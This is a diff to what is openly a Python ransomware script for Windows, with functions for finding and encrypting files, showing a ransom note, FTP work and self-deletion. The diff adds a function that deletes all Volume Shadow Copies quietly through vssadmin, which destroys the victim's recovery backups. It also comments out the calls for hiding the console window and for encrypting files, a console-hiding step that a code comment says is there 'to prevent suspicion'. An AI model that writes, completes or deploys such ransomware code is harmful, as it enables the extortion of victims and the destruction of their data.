@@ -154,6 +154,13 @@ def show_ransom_note():
             break
 
 
+def dlt_shadow_copy():
+    try:
+        os.system('vssadmin.exe delete shadows/all /quiet')
+    except Exception:
+        pass
+
+
 def delete_ransomware():
     usr = getpass.getuser()
     ransomware_path = 'C:/Users/' + usr
@@ -163,14 +170,15 @@ def delete_ransomware():
 
 def main():
     # Hides the terminal console to prevent suspicion while working in background
-    hide = win32gui.GetForegroundWindow()
-    win32gui.ShowWindow(hide, win32con.SW_HIDE)
-    find_file()
-    encrypt_file()
+    # hide = win32gui.GetForegroundWindow()
+    # win32gui.ShowWindow(hide, win32con.SW_HIDE)
+    # find_file()
+    # encrypt_file()
     message()
     # ransom_note()
     # show_ransom_note()
     # ftp_work()
+    # dlt_shadow_copy()
     # delete_ransomware()
 
 
